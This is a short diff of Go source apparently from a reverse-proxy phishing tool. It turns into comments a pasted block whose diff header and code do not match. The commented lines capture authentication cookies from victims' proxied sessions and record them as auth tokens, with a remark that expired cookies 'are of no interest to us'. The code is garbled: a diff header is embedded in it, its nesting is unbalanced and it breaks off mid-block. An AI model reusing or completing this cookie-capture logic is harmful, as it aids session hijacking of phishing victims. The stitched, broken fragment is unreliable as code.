@@ -1130,15 +1130,15 @@ func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
 	p.ip_sids[ip_addr] = sid
 }
 
-@@ -865,7 +865,6 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
-	ct := time.Now()
-	if pl.isAuthToken(c_domain, ck.Name) {
-						s, ok := p.sessions[ps.SessionId]
-						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
-								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
-								if len(pl.authUrls) > 0 {
-									is_auth = false
+// @@ -865,7 +865,6 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+// 	ct := time.Now()
+// 	if pl.isAuthToken(c_domain, ck.Name) {
+// 						s, ok := p.sessions[ps.SessionId]
+// 						if ok && (s.IsAuthUrl || !s.IsDone) {
+// 							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
+// 								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
+// 								if len(pl.authUrls) > 0 {
+// 									is_auth = false
 
 func (p *HttpProxy) isForwarderUrlBy2(req *http.Request) bool {
 
